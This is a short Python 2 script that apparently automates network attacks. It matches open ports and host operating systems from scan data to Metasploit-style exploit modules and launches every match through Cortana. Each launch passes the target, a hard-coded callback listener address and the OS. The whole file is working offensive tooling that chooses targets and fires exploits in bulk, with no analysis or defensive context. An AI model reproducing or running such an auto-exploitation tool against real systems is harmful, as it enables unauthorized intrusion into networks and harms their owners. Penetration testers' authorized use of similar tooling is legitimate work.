import sys
import time
import subprocess
from subprocess import Popen, PIPE, STDOUT
from collections import defaultdict

def print_attacks(attacks):
   
   for host in attacks:
      for port in attacks[host]:
         for attack in range(len(attacks[host][port])):
            print port, attacks[host][port][attack]['name'], attacks[host][port][attack]['modRank']

def determineAttackVectors(db_e, db_s, db_h):
   # figures out attack vectors based on hosts and services

   db = defaultdict()
   
   for host in db_h:
      if host not in db:
         db[host] = defaultdict()
      services_list = db_s[host]
      for service in services_list:
         if service['state'] == "open":
            if service['port'] in db_e:
               if service['port'] not in db[host]:
                  db[host][service['port']] = []
               for exploit in range(len(db_e[service['port']])):
                  if db_e[service['port']][exploit]['os'] == db_h[host]['os_name']:
                     db[host][service['port']].append(db_e[service['port']][exploit])
                  if db_h[host]['os_name'] == "linux" and db_e[service['port']][exploit]['os'] == "unix":
                     db[host][service['port']].append(db_e[service['port']][exploit])
                  if db_e[service['port']][exploit]['os'] == "multi":
                     db[host][service['port']].append(db_e[service['port']][exploit])
               
   #print db
   return db

def generate_attacks(attacks, db_h):
   
   lhost = "172.16.221.1"
   for host in attacks:
      rhost = host
      os = db_h[host]['os_name']
      for port in attacks[host]:
         for attack in range(len(attacks[host][port])):
	    p = subprocess.Popen(['java', '-jar', 'cortana.jar', 'connect.prop', 'attacks.cna'], stdout=subprocess.PIPE, stdin=subprocess.PIPE)
	    name = attacks[host][port][attack]['name']
	    p.stdin.write("cmdline_arg %s %s %s %s\n" % (name, rhost, lhost, os));
	  
	    output = p.communicate()[0]
	    print output
      
   p.stdin.close();
   
